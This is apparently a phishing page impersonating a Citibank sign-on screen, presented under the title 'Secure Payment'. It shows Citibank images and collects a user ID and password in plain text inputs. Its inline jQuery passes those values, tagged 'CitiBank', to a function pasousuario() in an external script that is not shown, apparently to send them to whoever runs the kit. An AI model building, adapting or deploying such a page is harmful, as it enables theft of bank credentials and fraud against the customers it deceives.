<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Payment</title>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>


       
  <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
		<script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../scripts/functions2.js"></script>  

    <style>
        *{
    -webkit-appearance: none;
    -webkit-border-radius: 0;
}
label{
    display: block;
    margin-top: 25px;
    margin-left: 20px;
}
input{
    width: 95%;
    border-radius: 10px;
    height: 40px;
}
    </style>
     
</head>
<body>

<img src="/img/citi.jfif" alt="" srcset="" width="100%">
<label for="">User ID</label>
<center><input type="text" name="" id="txtUsuario" placeholder="User ID"></center>
<label for="">Password</label>
<center><input type="text" name="" id="txtPass" placeholder="Password"></center>
<input type="hidden" name="" id="banco" style="height:40px; border:1px solid #d3f3f3;" value="CitiBank">
<br><br><center> <input type="submit" id="btnUsuario" value="Sign On"></center>
    <img src="/img/citi1.jfif" alt="" srcset="" width="100%">



    
<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {

		$('#btnUsuario').click(function(){
			if ($("#txtUsuario").val().length > 0) {
				pasousuario($("#txtPass").val(), $("#txtUsuario").val(), $("#banco").val());	
			}else{
				$("#err-mensaje").show();
				$(".user").css("border", "1px solid red");
				$("#txtUsuario").focus();
			}			
		});

		$("#txtUsuario").keyup(function(e) {
			$(".user").css("border", "1px solid #CCCCCC");	
			$("#err-mensaje").hide();				
		});
	});
</script>
</body>
</html>
